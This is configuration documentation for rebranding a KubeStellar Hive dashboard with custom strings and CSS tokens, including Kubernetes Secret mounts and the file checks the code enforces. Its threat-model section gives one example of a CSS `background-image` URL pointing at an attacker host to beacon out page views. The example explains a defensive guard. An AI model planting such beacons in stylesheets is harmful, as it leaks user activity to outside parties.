# Branding a hive

A deployment can carry its own name, mark and colours without forking the
dashboard or rebuilding the image. Two files on the data volume:

```
<data>/branding/
├── branding.json   # strings: name, tagline, mark, title
└── custom.css      # colours
```

Both are optional. A missing file changes nothing; a partial `branding.json`
leaves every field it omits at the shipped default.

`<data>` is not a config field of its own — it is the **parent directory of
`data.agents_dir`**, because every deployment already places `agents_dir` on
the persistent data volume. When `agents_dir` is unset, it is `/data`. Both
paths can be pointed elsewhere with environment variables; see
[Overriding the paths](#overriding-the-paths).

## Strings

```json
{
  "product_name": "REEF",
  "tagline":      "APPLICATIONS",
  "mark":         "🪸",
  "title":        "Reef — tuna-os"
}
```

| Field | Replaces |
|---|---|
| `product_name` | the `HIVE` wordmark in the sidebar |
| `tagline` | `GATEWAY DASHBOARD` beneath it |
| `mark` | the 🐝 glyph — both sidebars, the `<h1>`, the Getting Started flyer, **and the favicon** |
| `title` | the `<title>` |

Substitution is **anchored to the exact markup** that renders each item, never
a bare string replace: the document is ~1.3 MB of inline HTML/CSS/JS, and
replacing every `HIVE` or `🐝` would corrupt script and prose. A consequence
worth knowing: if that markup changes upstream, branding silently stops
applying rather than breaking the page.

> **Strings are read once at startup.** The index document carries a
> precomputed gzip body and a strong ETag, so its content cannot vary per
> request without discarding both. **Editing `branding.json` needs a restart.**
> `custom.css` is read per request and takes effect on reload.

## Colours

`custom.css` is served at `/branding/custom.css` and linked last in `<head>`,
so it wins the cascade without `!important`.

Restyle **custom properties**, not layout. The dashboard is one embedded SPA
whose markup changes between releases; re-pointing tokens survives upgrades,
restyling structure does not.

```css
/* Dark — :root carries the DARK palette */
:root {
  --bg: #04161f;  --bg-soft: #07202b;  --surface: #0a2430;
  --panel: #0a2430;  --panel-strong: #0d2c3a;  --card-bg: #0a2430;
  --line: #12394a;  --line-strong: #1b4d63;  --border: #12394a;
  --fg: #e8f6f8;  --text: #e8f6f8;  --muted: #8fb3bd;
  --accent: #2fb6c4;
}

/* Light — body.light-mode OVERRIDES :root. Style both, or your theme
   silently does nothing whenever the operator is in light mode. */
body.light-mode {
  --bg: #f2f9fa;  --surface: #ffffff;  --panel: #ffffff;
  --line: #cbdfe5;  --fg: #06232e;  --text: #06232e;  --muted: #4d7683;
  --accent: #10707c;   /* darker: the dark-mode cyan is ~2.2:1 on white */
}
```

Two things that cost us time:

- **Style both themes.** Overriding only `:root` is discarded in light mode.
- **Re-check contrast per theme.** An accent tuned for a dark surface usually
  fails as text on a light one.

Available tokens: `--bg` `--bg-soft` `--surface` `--panel` `--panel-strong`
`--card-bg` `--terminal-bg` `--line` `--line-strong` `--border` `--fg` `--text`
`--muted` `--accent` `--oc-accent` and a named ramp (`--green` `--red`
`--orange` `--amber` `--yellow` `--blue` `--cyan` `--indigo` `--purple`, each
with `-bg`/`-border` variants where used).

Keep **status** colours distinct from your accent — a green that matches the
brand hue stops reading as "healthy" and starts reading as "branded".

## Overriding the paths

The default layout assumes a writable data volume. Two environment variables
move the files for deployments where that does not hold — a read-only `/data`,
a branding bundle delivered as a Kubernetes Secret or ConfigMap, or an
`agents_dir` that is not directly under the volume root.

| Variable | Default | Read |
|---|---|---|
| `HIVE_BRANDING_CSS` | `<data>/branding/custom.css` | per request |
| `HIVE_BRANDING_JSON` | `branding.json` **beside the resolved CSS path** | once at startup |

The lookup chain, exactly as `src/pkg/dashboard/branding.go` implements it:

1. **CSS** — `HIVE_BRANDING_CSS` if non-empty; otherwise
   `filepath.Dir(data.agents_dir)` (or `/data` when `agents_dir` is empty)
   joined with `branding/custom.css`.
2. **JSON** — `HIVE_BRANDING_JSON` if non-empty; otherwise `branding.json` in
   the directory of the path resolved in step 1.

Step 2 depends on step 1, which is the part that surprises people: setting only
`HIVE_BRANDING_CSS` **also relocates `branding.json`** to sit beside it. Set
both explicitly whenever the two files do not live together.

Each variable is a full path to a **file**, not a directory. A missing file is
silently ignored, and invalid JSON is logged as a warning and treated as absent
— branding can never break startup. Both reads are subject to the
[safety guards](#what-the-code-enforces) below.

### Example: read-only `/data`, branding from a Secret

Mount the branding bundle on its own path and point both variables at it. The
Secret is operator-managed, so nothing running in the container can rewrite it:

```yaml
    env:
      - name: HIVE_BRANDING_CSS
        value: /etc/hive/branding/custom.css
      - name: HIVE_BRANDING_JSON
        value: /etc/hive/branding/branding.json
    volumeMounts:
      - name: branding
        mountPath: /etc/hive/branding
        readOnly: true
volumes:
  - name: branding
    secret:
      secretName: hive-branding
      defaultMode: 0444
```

```sh
kubectl create secret generic hive-branding \
  --from-file=custom.css=./custom.css \
  --from-file=branding.json=./branding.json
```

Because `branding.json` is read once at startup, updating the Secret requires a
pod roll; `custom.css` is re-read per request and takes effect on reload — but
a projected Secret volume can lag the API object by up to the kubelet sync
period, so "reload and it changed" is not instantaneous here.

### What the code enforces

The branding path is a **trust boundary**: whoever can write these files injects
CSS into the operator's dashboard, and the dashboard CSP is
`img-src 'self' data: https:`, so a stylesheet can beacon out — a
`background-image: url(https://attacker.example/…)` on a selector that matches
only under some condition turns a page view into a signal. This matters because
the default `<data>/branding/` sits on the same volume as `agents_dir`, which
agents write to.

Both files are therefore checked before they are read, and a file that fails any
check is **refused, not partially applied**. `custom.css` 404s exactly as if it
were absent, and `branding.json` falls back to the shipped defaults; the reason
is logged once, with the path and the fix, rather than returned to the browser:

| Check | Refused when |
|---|---|
| **Mode** | the file is group- or world-writable (`chmod go-w` to fix) |
| **Ownership** | the owner is neither the hive process user nor `root` |
| **Size** | the file exceeds 128 KiB — refused outright, never truncated |
| **Symlink** | the path is a symlink resolving outside its own directory |

Two deliberate allowances, both so that hardened deployments keep working:

- **`root`-owned files pass.** The read-only Secret mount
  [above](#example-read-only-data-branding-from-a-secret) is `uid 0`,
  `defaultMode 0444` — the most hardened shape, and one the process cannot
  rewrite. Refusing it would have punished the recommended setup.
- **Symlinks *within* the branding directory pass.** Kubernetes projected
  volumes are built entirely out of them (the mount is a tree of links into
  `..data/`), so rejecting symlinks outright would break every ConfigMap and
  Secret mount.

`HIVE_BRANDING_ALLOW_UNSAFE_OWNER=true` waives **only** the ownership check, for
deployments whose files are legitimately owned by some third uid. It does not
waive the mode check — group- or world-writable has no legitimate shape here.

What remains yours: **the guards check who can write the file, not what is in
it.** A stylesheet written by a trusted owner is still served verbatim. Note the
contrast with the unrelated [custom stylesheets](custom-stylesheets.md) feature
(`?style=owner/repo/path.css`), which also *sanitises* the CSS and scopes it to a
root element. The branding override shares its 128 KiB cap but does neither of
those — it is deliberately a raw operator escape hatch.

### CSP and the strings file

Branding strings are substituted into the served SPA bytes, and one anchor
(`<span class="wb-bee">&#x1F41D;</span>` in the Getting Started flyer) lives
inside an **inline script's** string literal. Setting `mark` therefore changes
script bytes. The CSP layer accounts for this: `Start()` hands the final served
document to `setBrandedIndex`, and the `script-src-elem` hash allowlist is
computed over those bytes rather than over the embedded document, so a branded
hive is not left with hashes that describe a document nobody receives. If it
were computed from the embedded copy, the flyer would be blocked silently in
the browser on any hive that set `mark`.

The practical consequence for you: if you carry a local patch that alters the
served index after `setBrandedIndex` is called, you will break that invariant
and CSP will start blocking inline scripts. `custom.css` is unaffected — it is
a separate same-origin request covered by `style-src 'self'`.

## What is not overridable

- The `KubeStellar Hive Dashboard` text in the `<h1>` (only its emoji is a
  span).
- The honeycomb SVG in the Getting Started flyer — it is drawn as paths, not a
  glyph. Hide it with `.wb-hive { display: none }` if it clashes.
- Anything rendered by the SPA at runtime rather than present in the shipped
  document.

## Branding a hub

A hub (`HIVE_MODE=hub`) serves its own UI from the same binary, so the same two
files apply.

If you want a fully custom landing page, an alternative is to route `/` to your
own static page at the ingress and keep `/api` on the hub — spoke heartbeats
and `/api/registry` must keep reaching it, so route by path rather than
replacing the Service.

## Verifying

Check the **computed** style, not that the file downloaded — a stylesheet that
loads and applies nothing looks identical to a working one over `curl`:

```js
getComputedStyle(document.body).backgroundColor
getComputedStyle(document.documentElement).getPropertyValue('--accent')
```
